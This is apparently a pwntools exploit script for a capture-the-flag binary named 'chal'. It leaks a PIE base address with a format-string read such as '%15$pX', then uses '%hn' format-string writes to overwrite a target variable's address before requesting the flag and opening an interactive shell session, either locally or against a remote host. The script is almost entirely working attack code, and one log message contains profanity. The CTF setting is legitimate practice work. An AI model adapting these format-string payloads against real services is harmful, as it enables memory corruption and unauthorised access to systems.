from pwn import *
import sys
from ctypes import CDLL

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./chal"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
    break *main+274
'''

libcx = CDLL("libc.so.6")
# now = int(floor(time.time()))
# libcx.srand(now)
# print(libcx.rand())

def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./desired_libc"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

def exploit():
    #offset = 
    log.info("binary loaded")
    pp.recvuntil(b": ")
    pp.sendline(b"%15$pX")
    elf.address = int(pp.recvuntil(b"X").replace(b"X", b"").split(b"0x")[1], 16) - 5752
    mother_bear = elf.address + 16452
    log.info(f"fucking pie base {hex(elf.address)} here's mother bear {hex(mother_bear)}")
    pay  = [b"AAAA%2985c%24$hn" + p64(mother_bear), b"AAAA%2985c%24$hn" + p64(mother_bear + 2)]
    for i in pay :
        pp.recvuntil(b": ")
        pp.sendline(i)
    print(pp.recvuntil(b": "))
    pp.sendline(b"flag")

    pp.interactive()

if (args.REMOTE):
    libc = ELF("./lib/libc.so.6")
else:
    libc = ELF("/usr/lib/libc.so.6")
libcrops = ROP(libc)
elf = context.binary = ELF(binary)
pp = init()
exploit()
